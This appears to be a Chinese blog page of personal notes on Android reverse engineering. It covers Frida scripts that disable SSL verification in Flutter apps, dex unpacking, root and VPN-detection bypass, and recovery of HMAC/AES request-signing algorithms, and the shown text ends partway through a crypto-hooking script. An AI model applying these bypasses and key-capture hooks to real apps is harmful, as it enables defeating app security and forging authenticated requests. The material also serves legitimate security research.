<p><a href="https://github.com/WooyunDota/DroidSSLUnpinning?tab=readme-ov-file">https://github.com/WooyunDota/DroidSSLUnpinning?tab=readme-ov-file</a></p>
<p><a href="https://codeshare.frida.re/@akabe1/frida-multiple-unpinning/">https://codeshare.frida.re/@akabe1/frida-multiple-unpinning/</a></p>
<p><a href="https://ch3nye.top/Android-HTTPS%E8%AE%A4%E8%AF%81%E7%9A%84N%E7%A7%8D%E6%96%B9%E5%BC%8F%E5%92%8C%E5%AF%B9%E6%8A%97%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93">https://ch3nye.top/Android-HTTPS认证的N种方式和对抗方法总结</a></p>
<p>下载导入 httpstest，apk源码</p>
<p>SSL PINNING 更新公钥和证书：</p>
<p>1、修改百度公钥，from hex，tobase64</p>
<p>2、修改bing.com的证书校验，导出baidu的证书，校验的网站也改成百度</p>
<p>对抗VPN和代理</p>
<p>ProxyDroid</p>
<p>iptables——在app限制代理和vpn抓包下的另类 解决办法</p>
<p>r0capture</p>
<p>flutter (app开发框架) 抓包</p>
<p>IDA 搜索 ssl_client，选择所在函数头的特征码，operation-General-Number of opcode bytes (4)</p>
<p>用 frida hook app 内部 SSL 验证，把校验关了就能抓到包了。用在挂了代理&#x2F;VPN抓不到包的场景</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook_ssl_verify_result</span>(<span class="params">address</span>) &#123;</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(address, &#123;</span><br><span class="line">            <span class="attr">onEnter</span>: <span class="keyword">function</span>(<span class="params">args</span>) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Disabling SSL validation&quot;</span>)</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onLeave</span>: <span class="keyword">function</span>(<span class="params">retval</span>) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Retval: &quot;</span> + retval);</span><br><span class="line">                retval.<span class="title function_">replace</span>(<span class="number">0x1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// lib目录下</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hookFlutter</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> m = <span class="title class_">Process</span>.<span class="title function_">findModuleByName</span>(<span class="string">&quot;libflutter.so&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> pattern = <span class="string">&quot;FF 03 05 D1 FD 7B 0F A9 9A E3 05 94 08 0A 80 52 48 00 00 39 16 54 40 F9 56 07 00 B4 C8 02 40 F9 08 07 00 B4&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> res = <span class="title class_">Memory</span>.<span class="title function_">scan</span>(m.<span class="property">base</span>, m.<span class="property">size</span>, pattern, &#123;</span><br><span class="line">            <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">address, size</span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;[+] ssl_verify_result found at: &#x27;</span> + address.<span class="title function_">toString</span>());</span><br><span class="line">                <span class="title function_">hook_ssl_verify_result</span>(address); </span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onError</span>: <span class="keyword">function</span>(<span class="params">reason</span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;[!] There was an error scanning memory&#x27;</span>);</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;All done&quot;</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>动态加载 dex，dex文件是apk的二进制包？</p>
<p>三代加壳技术</p>
<p>frida_dexdump，用objection加载插件，python启动 </p>
<p>grep -ril “xxx” * &#x2F;&#x2F;在dex目录搜关键词</p>
<p>一代壳直接dump，内存即完整</p>
<p>二代壳动态加载，youpk</p>
<p>第一次启动 frida 时的 venv 环境切换</p>
<h1 id="抓取海外app的包"><a href="#抓取海外app的包" class="headerlink" title="抓取海外app的包"></a>抓取海外app的包</h1><p>Charles_Proxy_External Proxy Settings_打勾前两个，用于设置 charles 的上游出口</p>
<p>app -&gt;VPN -&gt; Charles -&gt; 本地proxy -&gt;服务器</p>
<p>用在线工具把请求头直接转换成py代码、右键copy cURL Request</p>
<p><a href="https://curlconverter.com/">https://curlconverter.com</a></p>
<p>分析 x-xxx-devices</p>
<p>1、apk直接拖进 jadx</p>
<p>2、搜索 &#x2F; 自吐脚本或者算法助手 &#x2F; 手动定位</p>
<p>3、jadx 选中字段按 x，查找调用</p>
<p>4、默认手机里安装的apk在，&#x2F;data&#x2F;data&#x2F;包名&#x2F;shared_prefs</p>
<p>5、清除应用信息，缓存的文件就没了</p>
<p>6、有个a方法</p>
<p><a href="https://boyyongxin.github.io/2021/06/10/%E5%A6%82%E4%BD%95%E6%8A%93%E5%8F%96%E5%9B%BD%E5%A4%96%E7%BD%91%E7%AB%99%E3%80%81app%E7%9A%84%E5%8C%85">https://boyyongxin.github.io/2021/06/10/%E5%A6%82%E4%BD%95%E6%8A%93%E5%8F%96%E5%9B%BD%E5%A4%96%E7%BD%91%E7%AB%99%E3%80%81app%E7%9A%84%E5%8C%85</a></p>
<p>1、搜索字段 x-xxx-signature<br>2、密码学基础：(这个key就是加密值)<br>        2.1、mac.update(key)<br>        2.2、doFinal(key)</p>
<pre><code>(根据digest往上找，根据空字符串去做SHA256加密-&gt;FROM HEX-&gt;to base64)

HmacSHA256 update data Utf8:  digest:47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=
host:openapi.xxx.com
key-id:gf665hj0kpsdkpllgek11zrz
target:get /xxxapps/v3/bespoke/member/search-with-ads/mmx?keywords=iphone case mockup&amp;currency=CNY&amp;buyer_features[app_foreground_time]=1730735563258&amp;buyer_features[app_initial_start_time]=1730304497092&amp;buyer_features[device_model]=OnePlus GM1910&amp;buyer_features[network_type]=WWAN&amp;with_static_filters=true&amp;include_additional_listing_images=true&amp;ship_to=CN&amp;instant_download=null&amp;category_prolist=1&amp;sort_on=score&amp;sort_order=down&amp;include_featured_categories=false&amp;with_deep_facets=1
timestamp:1730736403
version:1
x-xxx-device:1k5BCmYBShylRczcYkN5HQ
HmacSHA256 update data Hex:  6469676573743a3437444....
HmacSHA256 update data Base64:  ZGlnZXN0OjQ3REVRcGo4S....

HmacSHA256 doFinal result Hex:  a1dd6501b449be5b....
HmacSHA256 doFinal result Base64:  od1lAbRJvlvA794Un2/vXWnM6L0DWHriXmWEwENNiD4=
AES/CTR/NoPadding update data Utf8:  oauth2_access_token
AES/CTR/NoPadding update data Hex:  6f61757468325f6163636573735f746f6b656e
AES/CTR/NoPadding update data Base64:  b2F1dGgyX2FjY2Vzc190b2tlbg==
AES/CTR/NoPadding doFinal result Hex:  2def734bbf607b03703dbf58ca6ded8ebf578d
AES/CTR/NoPadding doFinal result Base64:  Le9zS79gewNwPb9Yym3tjr9XjQ==
</code></pre>
<p>3、算法还原（cyberchef &#x2F; java代码）<br>    hmac (key、SHA256)<br>    FROM HEX<br>    TO BASE64</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">device_id.py</span><br><span class="line"></span><br><span class="line">UUID randomUUID = UUID.randomUUID();</span><br><span class="line">ByteBuffer wrap = ByteBuffer.wrap(new byte[16]);</span><br><span class="line">wrap.putLong(randomUUID.getMostSignificantBits());</span><br><span class="line">wrap.putLong(randomUUID.getLeastSignificantBits());</span><br><span class="line">return Base64.encodeToString(wrap.array(), 11);</span><br></pre></td></tr></table></figure>





<h3 id="xBox-算法还原"><a href="#xBox-算法还原" class="headerlink" title="xBox  算法还原"></a>xBox  算法还原</h3><p>1、frida-dump 脱壳多个dex，利用其他 frida 脚本  youpk &#x2F; aprt &#x2F; FART脱壳</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">frida脚本脱壳</span><br><span class="line">1、dex写入目录需要权限</span><br><span class="line">2、mkdir box_fart / mv *.dex box_fart/</span><br><span class="line">3、adb pull xxx/box_fart</span><br><span class="line">grep -ril &quot;xxxMainActivity&quot; //当前目录的dex搜索</span><br><span class="line"></span><br><span class="line">frida-dump -&gt; FART -&gt; youpk</span><br><span class="line">logcat</span><br></pre></td></tr></table></figure>

<p><a href="https://bbs.kanxue.com/thread-259854.htm">https://bbs.kanxue.com/thread-259854.htm</a></p>
<p>脱下来也是多个dex</p>
<p>疑问：为什么这里要用Youpk脱壳呢，用frida-dump不行嘛</p>
<p>2、过 root 检测</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、jadx会重命名，要hook原来的包名</span><br><span class="line">2、js脚本 </span><br><span class="line">function xxx()&#123;</span><br><span class="line">	Java.perform(function()&#123;</span><br><span class="line">		xxx</span><br><span class="line">	&#125;)</span><br><span class="line">&#125;</span><br><span class="line">function main() &#123;</span><br><span class="line">    xxx()</span><br><span class="line">&#125;    </span><br><span class="line">setInterval(main, 1000);</span><br><span class="line">// 有壳 frida 脚本要延迟加载</span><br></pre></td></tr></table></figure>

<p>绕过后没数据，有VPN检测</p>
<p>利用 AS 的 logcat 可以查看当前手机运行的 app 打印的日志</p>
<p>用 AS 查看方便点，直接 adb logcat 也行</p>
<p>3、flutter框架的抓包方式</p>
<p><a href="https://bbs.kanxue.com/thread-261941.htm">https://bbs.kanxue.com/thread-261941.htm</a></p>
<p><a href="https://juejin.cn/post/7106300111927377956">https://juejin.cn/post/7106300111927377956</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">直接按压缩包方式解压找到 libflutter.so，分析 SSL 入口点</span><br><span class="line">1、IDA 打开 libflutter.so</span><br><span class="line">2、Shift+F12 搜索 ssl_client</span><br><span class="line">3、找引用</span><br><span class="line">4、反汇编</span><br><span class="line">5、找开头 sub_xxx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shift+f12：可以打开string窗口，一键找出所有的字符串，右击setup，还能对窗口的属性进行设置</span><br><span class="line">x：对着某个函数、变量按该快捷键，可以查看它的交叉引用</span><br><span class="line">g：直接跳转到某个地址</span><br><span class="line">f5：一键反汇编</span><br></pre></td></tr></table></figure>

<p>HttpCanary</p>
<p>wToken</p>
<p>4、RPC远程调用</p>
<h3 id="PANDA-8-33-0-算法还原"><a href="#PANDA-8-33-0-算法还原" class="headerlink" title="PANDA(8.33.0) 算法还原"></a>PANDA(8.33.0) 算法还原</h3><p>md5可能是16位也可能是32位</p>
<p>1、算法助手和自吐脚本都是hook某个操作过程的算法操作，可用于分析加密</p>
<p>2、自吐脚本是通用的嘛</p>
<p><a href="https://www.secpulse.com/archives/177572.html">https://www.secpulse.com/archives/177572.html</a></p>
<p>request_pkcs12</p>
<p>估计是证书没导入到抓包软件导致抓不到</p>
<h3 id="xliji-算法还原"><a href="#xliji-算法还原" class="headerlink" title="xliji  算法还原"></a>xliji  算法还原</h3><p>1、检测 root，最简单就直接 hook 返回 false（当前运行环境有风险）</p>
<p>2、DES只取8个字节</p>
<p>算法还原，请求里的每个加密字段 addHeader</p>
<p>base64 后要 to hex下</p>
<p>具体是在分析哪个字段</p>
<p>目标：</p>
<p>1、based 字段的生成，每次都是固定。自吐脚本跟踪堆栈，跟踪生成加密的具体方法，用java还原</p>
<p>2、phone字段的生成，<strong>不确定就 hook 某个函数的返回值</strong></p>
<p>3、简单还原函数调用直接就hook入参</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// zitu.js</span></span><br><span class="line"><span class="keyword">const</span> config = &#123;</span><br><span class="line">    <span class="attr">showStacks</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">showDivider</span>: <span class="literal">true</span>,</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// console.log(&#x27;frida 已启动&#x27;);</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">showStacks</span>(<span class="params">name = <span class="string">&#x27;&#x27;</span></span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (config.<span class="property">showStacks</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;android.util.Log&#x27;</span>).<span class="title function_">getStackTraceString</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;java.lang.Throwable&#x27;</span>).$new(name)))</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">showDivider</span>(<span class="params">name = <span class="string">&#x27;&#x27;</span></span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (config.<span class="property">showDivider</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`==============================<span class="subst">$&#123;name&#125;</span>==============================`</span>)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">showArguments</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;arguments: &#x27;</span>, ...<span class="variable language_">arguments</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">const</span> <span class="title class_">ByteString</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.android.okhttp.okio.ByteString&#x27;</span>)</span><br><span class="line">    <span class="keyword">const</span> <span class="title class_">Encode</span> = &#123;</span><br><span class="line">      <span class="title function_">toBase64</span>(<span class="params">tag, data</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(tag + <span class="string">&#x27; Base64: &#x27;</span>, <span class="title class_">ByteString</span>.<span class="title function_">of</span>(data).<span class="title function_">base64</span>())</span><br><span class="line">        <span class="comment">// console.log(tag + &#x27; Base64: &#x27;, bytesToBase64(data));</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="title function_">toHex</span>(<span class="params">tag, data</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(tag + <span class="string">&#x27; Hex: &#x27;</span>, <span class="title class_">ByteString</span>.<span class="title function_">of</span>(data).<span class="title function_">hex</span>())</span><br><span class="line">        <span class="comment">// console.log(tag + &#x27; Hex: &#x27;, bytesToHex(data));</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="title function_">toUtf8</span>(<span class="params">tag, data</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(tag + <span class="string">&#x27; Utf8: &#x27;</span>, <span class="title class_">ByteString</span>.<span class="title function_">of</span>(data).<span class="title function_">utf8</span>())</span><br><span class="line">        <span class="comment">// console.log(tag + &#x27; Utf8: &#x27;, bytesToString(data));</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="title function_">toAll</span>(<span class="params">tag, data</span>) &#123;</span><br><span class="line">        <span class="title class_">Encode</span>.<span class="title function_">toUtf8</span>(tag, data)</span><br><span class="line">        <span class="title class_">Encode</span>.<span class="title function_">toHex</span>(tag, data)</span><br><span class="line">        <span class="title class_">Encode</span>.<span class="title function_">toBase64</span>(tag, data)</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="title function_">toResult</span>(<span class="params">tag, data</span>) &#123;</span><br><span class="line">        <span class="title class_">Encode</span>.<span class="title function_">toHex</span>(tag, data)</span><br><span class="line">        <span class="title class_">Encode</span>.<span class="title function_">toBase64</span>(tag, data)</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">const</span> <span class="title class_">MessageDigest</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="params"><span class="string">&#x27;java.security.MessageDigest&#x27;</span></span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">let</span> overloads_update = <span class="title class_">MessageDigest</span>.<span class="property">update</span>.<span class="property">overloads</span></span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">const</span> overload <span class="keyword">of</span> overloads_update) &#123;</span><br><span class="line">        overload.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">          <span class="keyword">const</span> algorithm = <span class="variable language_">this</span>.<span class="title function_">getAlgorithm</span>()</span><br><span class="line">          <span class="title function_">showDivider</span>(algorithm)</span><br><span class="line">          <span class="title function_">showStacks</span>(algorithm)</span><br><span class="line">          <span class="title class_">Encode</span>.<span class="title function_">toAll</span>(<span class="string">`<span class="subst">$&#123;algorithm&#125;</span> update data`</span>, <span class="variable language_">arguments</span>[<span class="number">0</span>])</span><br><span class="line">          <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">update</span>(...<span class="variable language_">arguments</span>)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  </span><br><span class="line">      <span class="keyword">let</span> overloads_digest = <span class="title class_">MessageDigest</span>.<span class="property">digest</span>.<span class="property">overloads</span></span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">const</span> overload <span class="keyword">of</span> overloads_digest) &#123;</span><br><span class="line">        overload.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">          <span class="keyword">const</span> algorithm = <span class="variable language_">this</span>.<span class="title function_">getAlgorithm</span>()</span><br><span class="line">          <span class="title function_">showDivider</span>(algorithm)</span><br><span class="line">          <span class="title function_">showStacks</span>(algorithm)</span><br><span class="line">          <span class="keyword">const</span> result = <span class="variable language_">this</span>.<span class="title function_">digest</span>(...<span class="variable language_">arguments</span>)</span><br><span class="line">          <span class="keyword">if</span> (<span class="variable language_">arguments</span>.<span class="property">length</span> === <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="title class_">Encode</span>.<span class="title function_">toAll</span>(<span class="string">`<span class="subst">$&#123;algorithm&#125;</span> update data`</span>, <span class="variable language_">arguments</span>[<span class="number">0</span>])</span><br><span class="line">          &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">arguments</span>.<span class="property">length</span> === <span class="number">3</span>) &#123;</span><br><span class="line">            <span class="title class_">Encode</span>.<span class="title function_">toAll</span>(<span class="string">`<span class="subst">$&#123;algorithm&#125;</span> update data`</span>, <span class="variable language_">arguments</span>[<span class="number">0</span>])</span><br><span class="line">          &#125;</span><br><span class="line">  </span><br><span class="line">          <span class="title class_">Encode</span>.<span class="title function_">toResult</span>(<span class="string">`<span class="subst">$&#123;algorithm&#125;</span> digest result`</span>, result)</span><br><span class="line">          <span class="keyword">return</span> result</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">const</span> <span class="title class_">Mac</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="params"><span class="string">&#x27;javax.crypto.Mac&#x27;</span></span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="title class_">Mac</span>.<span class="property">init</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.security.Key&#x27;</span>, <span class="string">&#x27;java.security.spec.AlgorithmParameterSpec&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">key, AlgorithmParameterSpec</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">init</span>(key, <span class="title class_">AlgorithmParameterSpec</span>)</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="title class_">Mac</span>.<span class="property">init</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.security.Key&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">key</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> algorithm = <span class="variable language_">this</span>.<span class="title function_">getAlgorithm</span>()</span><br><span class="line">        <span class="title function_">showDivider</span>(algorithm)</span><br><span class="line">        <span class="title function_">showStacks</span>(algorithm)</span><br><span class="line">        <span class="keyword">const</span> keyBytes = key.<span class="title function_">getEncoded</span>()</span><br><span class="line">        <span class="title class_">Encode</span>.<span class="title function_">toAll</span>(<span class="string">`<span class="subst">$&#123;algorithm&#125;</span> init Key`</span>, keyBytes)</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">init</span>(...<span class="variable language_">arguments</span>)</span><br><span class="line">      &#125;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">      <span class="keyword">let</span> overloads_update = <span class="title class_">Mac</span>.<span class="property">update</span>.<span class="property">overloads</span></span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">const</span> overload <span class="keyword">of</span> overloads_update) &#123;</span><br><span class="line">        overload.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">          <span class="keyword">const</span> algorithm = <span class="variable language_">this</span>.<span class="title function_">getAlgorithm</span>()</span><br><span class="line">          <span class="title function_">showDivider</span>(algorithm)</span><br><span class="line">          <span class="title function_">showStacks</span>(algorithm)</span><br><span class="line">          <span class="comment">// const result = this.update(...arguments)</span></span><br><span class="line">          <span class="keyword">if</span> (<span class="variable language_">arguments</span>.<span class="property">length</span> === <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="title class_">Encode</span>.<span class="title function_">toAll</span>(<span class="string">`<span class="subst">$&#123;algorithm&#125;</span> update data`</span>, <span class="variable language_">arguments</span>[<span class="number">0</span>])</span><br><span class="line">          &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">arguments</span>.<span class="property">length</span> === <span class="number">3</span>) &#123;</span><br><span class="line">            <span class="title class_">Encode</span>.<span class="title function_">toAll</span>(<span class="string">`<span class="subst">$&#123;algorithm&#125;</span> update data`</span>, <span class="variable language_">arguments</span>[<span class="number">0</span>])</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">update</span>(...<span class="variable language_">arguments</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">let</span> overloads_doFinal = <span class="title class_">Mac</span>.<span class="property">doFinal</span>.<span class="property">overloads</span></span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">const</span> overload <span class="keyword">of</span> overloads_doFinal) &#123;</span><br><span class="line">        overload.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">          <span class="keyword">const</span> algorithm = <span class="variable language_">this</span>.<span class="title function_">getAlgorithm</span>()</span><br><span class="line">          <span class="title function_">showDivider</span>(algorithm)</span><br><span class="line">          <span class="title function_">showStacks</span>(algorithm)</span><br><span class="line">          <span class="keyword">const</span> result = <span class="variable language_">this</span>.<span class="title function_">doFinal</span>(...<span class="variable language_">arguments</span>)</span><br><span class="line">          <span class="keyword">if</span> (<span class="variable language_">arguments</span>.<span class="property">length</span> === <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="title class_">Encode</span>.<span class="title function_">toAll</span>(<span class="string">`<span class="subst">$&#123;algorithm&#125;</span> update data`</span>, <span class="variable language_">arguments</span>[<span class="number">0</span>])</span><br><span class="line">          &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">arguments</span>.<span class="property">length</span> === <span class="number">3</span>) &#123;</span><br><span class="line">            <span class="title class_">Encode</span>.<span class="title function_">toAll</span>(<span class="string">`<span class="subst">$&#123;algorithm&#125;</span> update data`</span>, <span class="variable language_">arguments</span>[<span class="number">0</span>])</span><br><span class="line">          &#125;</span><br><span class="line">  </span><br><span class="line">          <span class="title class_">Encode</span>.<span class="title function_">toResult</span>(<span class="string">`<span class="subst">$&#123;algorithm&#125;</span> doFinal result`</span>, result)</span><br><span class="line">          <span class="keyword">return</span> result</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">const</span> <span class="title class_">Cipher</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="params"><span class="string">&#x27;javax.crypto.Cipher&#x27;</span></span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">let</span> overloads_init = <span class="title class_">Cipher</span>.<span class="property">init</span>.<span class="property">overloads</span></span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">const</span> overload <span class="keyword">of</span> overloads_init) &#123;</span><br><span class="line">        overload.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">          <span class="keyword">const</span> algorithm = <span class="variable language_">this</span>.<span class="title function_">getAlgorithm</span>()</span><br><span class="line">          <span class="title function_">showDivider</span>(algorithm)</span><br><span class="line">          <span class="title function_">showStacks</span>(algorithm)</span><br><span class="line">  </span><br><span class="line">          <span class="keyword">if</span> (<span class="variable language_">arguments</span>[<span class="number">0</span>]) &#123;</span><br><span class="line">            <span class="keyword">const</span> mode = <span class="variable language_">arguments</span>[<span class="number">0</span>]</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;algorithm&#125;</span> init mode`</span>, mode)</span><br><span class="line">          &#125;</span><br><span class="line">  </span><br><span class="line">          <span class="keyword">if</span> (<span class="variable language_">arguments</span>[<span class="number">1</span>]) &#123;</span><br><span class="line">            <span class="keyword">const</span> className = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="variable language_">arguments</span>[<span class="number">1</span>])</span><br><span class="line">            <span class="comment">// 安卓10以上私钥是有可能输出不了的</span></span><br><span class="line">            <span class="keyword">if</span> (className.<span class="title function_">includes</span>(<span class="string">&#x27;OpenSSLRSAPrivateKey&#x27;</span>)) &#123;</span><br><span class="line">              <span class="comment">// const keyBytes = arguments[1];</span></span><br><span class="line">              <span class="comment">// console.log(`$&#123;algorithm&#125; init key`, keyBytes);</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="keyword">const</span> keyBytes = <span class="variable language_">arguments</span>[<span class="number">1</span>].<span class="title function_">getEncoded</span>()</span><br><span class="line">              <span class="title class_">Encode</span>.<span class="title function_">toAll</span>(<span class="string">`<span class="subst">$&#123;algorithm&#125;</span> init key`</span>, keyBytes)</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">  </span><br><span class="line">          <span class="keyword">if</span> (<span class="variable language_">arguments</span>[<span class="number">2</span>]) &#123;</span><br><span class="line">            <span class="keyword">const</span> className = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="variable language_">arguments</span>[<span class="number">2</span>])</span><br><span class="line">            <span class="keyword">if</span> (className.<span class="title function_">includes</span>(<span class="string">&#x27;javax.crypto.spec.IvParameterSpec&#x27;</span>)) &#123;</span><br><span class="line">              <span class="keyword">const</span> iv = <span class="title class_">Java</span>.<span class="title function_">cast</span>(<span class="variable language_">arguments</span>[<span class="number">2</span>], <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;javax.crypto.spec.IvParameterSpec&#x27;</span>))</span><br><span class="line">              <span class="keyword">const</span> ivBytes = iv.<span class="title function_">getIV</span>()</span><br><span class="line">              <span class="title class_">Encode</span>.<span class="title function_">toAll</span>(<span class="string">`<span class="subst">$&#123;algorithm&#125;</span> init iv`</span>, ivBytes)</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (className.<span class="title function_">includes</span>(<span class="string">&#x27;java.security.SecureRandom&#x27;</span>)) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">  </span><br><span class="line">          <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">init</span>(...<span class="variable language_">arguments</span>)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  </span><br><span class="line">      <span class="keyword">let</span> overloads_doFinal = <span class="title class_">Cipher</span>.<span class="property">doFinal</span>.<span class="property">overloads</span></span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">const</span> overload <span class="keyword">of</span> overloads_doFinal) &#123;</span><br><span class="line">        overload.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">          <span class="keyword">const</span> algorithm = <span class="variable language_">this</span>.<span class="title function_">getAlgorithm</span>()</span><br><span class="line">          <span class="title function_">showDivider</span>(algorithm)</span><br><span class="line">          <span class="title function_">showStacks</span>(algorithm)</span><br><span class="line">          <span class="keyword">const</span> result = <span class="variable language_">this</span>.<span class="title function_">doFinal</span>(...<span class="variable language_">arguments</span>)</span><br><span class="line">          <span class="keyword">if</span> (<span class="variable language_">arguments</span>.<span class="property">length</span> === <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="title class_">Encode</span>.<span class="title function_">toAll</span>(<span class="string">`<span class="subst">$&#123;algorithm&#125;</span> update data`</span>, <span class="variable language_">arguments</span>[<span class="number">0</span>])</span><br><span class="line">          &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">arguments</span>.<span class="property">length</span> === <span class="number">3</span>) &#123;</span><br><span class="line">            <span class="title class_">Encode</span>.<span class="title function_">toAll</span>(<span class="string">`<span class="subst">$&#123;algorithm&#125;</span> update data`</span>, <span class="variable 